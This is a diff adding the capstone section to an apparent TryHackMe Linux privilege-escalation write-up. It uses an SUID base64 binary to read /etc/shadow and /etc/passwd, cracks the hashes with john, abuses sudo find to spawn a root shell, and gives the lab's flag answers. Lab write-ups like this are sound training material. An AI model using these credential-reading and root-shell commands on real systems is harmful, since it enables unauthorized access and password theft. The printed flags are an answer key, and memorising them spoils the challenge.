@@ -434,6 +434,88 @@ cat /home/matt/flag7.txt
 | --- | --- |
 | Answer | THM-89384012 |
 
+## Capstone Challenge
+
+Look an overview, there is an empty folder
+
+![image](https://user-images.githubusercontent.com/90561566/197378519-719f4189-011a-4c7f-9688-d160bfc1f887.png)
+
+enumeration
+
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+i see base64 can use with SUID
+
+![image](https://user-images.githubusercontent.com/90561566/197378776-c317b84d-4108-41c3-86e0-9d7c8e7102d5.png)
+
+now we will use base64 to unshadow /shadow and /passwd data
+
+```
+base64 /etc/shadow | base64 -d
+base64 /etc/passwd | base64 -d
+```
+
+and copy the password hash to 2 files
+
+![image](https://user-images.githubusercontent.com/90561566/197379167-9c608ae2-d30f-48fb-9165-958c0b441ee6.png)
+
+now crack the password
+
+```
+sudo unshadow passwd.txt shadow.txt > cracked.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt cracked.txt
+john --show cracked.txt
+```
+
+![image](https://user-images.githubusercontent.com/90561566/197379355-9b635ea7-d3fa-4d7f-9328-984075906b79.png)
+
+switch to `missy` with `Password1`
+
+![image](https://user-images.githubusercontent.com/90561566/197379459-86579921-8490-424b-a9b7-2e9a3d1d61ed.png)
+
+```
+sudo -l -l
+```
+
+![image](https://user-images.githubusercontent.com/90561566/197379515-52def7d5-559d-415a-be52-c24578946f57.png)
+
+now we can find our 2 flags location with sudoer
+
+```
+sudo find / -name *flag*.txt
+```
+
+![image](https://user-images.githubusercontent.com/90561566/197379587-a1263d5d-6ce1-4d81-a8d6-2ada79dde928.png)
+
+cat the flag1
+
+![image](https://user-images.githubusercontent.com/90561566/197379600-d960542d-15cc-4371-abe3-fe65c65bf5f0.png)
+
+| Flag | flag1.txt |
+| --- | --- |
+| Answer | THM-42828719920544 |
+
+now we need root access to see rootflag
+
+![image](https://user-images.githubusercontent.com/90561566/197379688-916ce77a-ec60-4e15-8ead-bdfae2c50316.png)
+
+that is very easy with
+
+![image](https://user-images.githubusercontent.com/90561566/197379748-ff94d0ac-b0cf-4ce0-b872-1f2d62780ad5.png)
+
+```
+sudo find . -exec /bin/sh \; -quit
+```
+
+![image](https://user-images.githubusercontent.com/90561566/197379789-5441610c-3701-48f7-8767-c453499f0b0a.png)
+
+| Flag | flag2.txt |
+| --- | --- |
+| Answer | THM-168824782390238 |
+
+
 
 
 
